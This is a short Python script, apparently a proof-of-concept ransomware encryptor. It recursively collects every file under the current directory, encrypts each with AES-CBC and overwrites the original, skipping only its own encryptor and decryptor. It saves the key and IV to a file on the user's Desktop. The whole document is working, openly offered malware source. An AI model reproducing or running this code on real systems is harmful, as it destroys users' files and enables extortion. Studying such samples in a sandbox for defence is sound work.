#!/usr/bin/python3
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# Get files recursively from the directory we are in (Sandbox implementation)
def getFilesRecursively():
	files_to_infect = []
	for dirs, subs, files in os.walk(os.getcwd()):
		for file in files:
			files_to_infect.append(dirs + '/' + file)
	return files_to_infect

# Encryptor function that encrypts a file and overwrites it
def encrypt(file, data, key, iv):
	cipher = AES.new(key, AES.MODE_CBC, iv)
	ciphertext = cipher.encrypt(pad(data, 16))
	with open(file, 'wb') as encryption_handle:
		encryption_handle.write(ciphertext)

# We don't want to encrypt our encryptor or decryptor
def validation(data):
	if b"#######################ENCRYPTOR########################" in data:
		return False
	elif b"#######################DECRYPTOR########################" in data:
		return False
	return True
	
# Key and IV generation
def keygen():
	os.system("touch ~/Desktop/keys")
	# Save it under desktop/keys for proof of concept
	with open(f"{os.path.expanduser('~')}/Desktop/keys", 'wb') as keyhandle:
		# Generate random bytes for key and IV and save it externally
		key = get_random_bytes(32)
		iv = get_random_bytes(16)
		keyhandle.write(key)
		keyhandle.write(iv)
		return key,iv

# Create the key and IV
key, iv = keygen()

# Get all the files
for file in getFilesRecursively():
	# Read the file contents to see if we want to encrypt it
	with open(file, 'rb') as encryptor_handle:
		data = encryptor_handle.read()
	# If its our encryptor or decryptor STOP!
	if not validation(data):
		continue
	# Encrypt the files
	encrypt(file, data, key, iv)



#######################ENCRYPTOR########################